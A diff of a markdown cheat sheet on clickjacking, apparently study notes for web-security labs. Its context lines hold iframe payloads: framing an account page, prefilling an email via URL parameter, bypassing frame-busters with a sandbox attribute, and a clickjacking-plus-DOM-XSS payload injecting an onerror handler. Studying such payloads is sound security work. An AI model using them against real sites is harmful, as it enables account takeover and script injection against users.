@@ -21,13 +21,15 @@
 </style>
 <div>Click me</div>
 <iframe src="<IP>/my-account"></iframe>
+
 // PRELOADED DATA BY URL PARAMETER
 <iframe src="<IP>/my-account?email=foo@gmail.com"></iframe>
+
 // ANTI FRAME BUSTER SCRIPT (DISABLE JAVASCRIPT)
 <iframe sandbox="allow-forms" src="<IP>/my-account?email=foo@gmail.com"></iframe>
+
 // CLICKJACKING + DOM XSS
 <iframe src="<IP>/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
-
 ```
 
 MULTISTEP CLICKJACKING
